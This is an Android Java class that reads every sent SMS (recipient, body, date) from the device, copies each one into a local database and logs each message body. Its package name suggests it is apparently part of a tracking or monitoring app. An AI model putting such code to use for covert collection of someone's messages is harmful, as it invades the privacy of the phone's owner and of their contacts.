package com.lurkerx.gpsjob.smsjob;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class SmsFetch {

    private static final String TAG = "SmsFetch";
    private final Context context;
    private final SmsDatabaseHelper dbHelper;

    public SmsFetch(Context context) {
        this.context = context.getApplicationContext();
        this.dbHelper = new SmsDatabaseHelper(this.context);
    }

    public void fetchSentSms() {
        ContentResolver resolver = context.getContentResolver();
        Uri sentUri = Uri.parse("content://sms/sent");

        Cursor cursor = null;
        try {
            cursor = resolver.query(
                    sentUri,
                    new String[]{"_id", "address", "body", "date"},
                    null,
                    null,
                    "date DESC"
            );

            if (cursor == null) {
                Log.w(TAG, "No sent SMS found");
                return;
            }

            while (cursor.moveToNext()) {
                long id = cursor.getLong(cursor.getColumnIndexOrThrow("_id"));
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                String type = "sent";
                dbHelper.insertSms(address, body, date, type);
                Log.d(TAG, "Inserted sent SMS: " + address + " | " + body);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error fetching sent SMS", e);
        } finally {
            if (cursor != null) cursor.close();
        }
    }
}
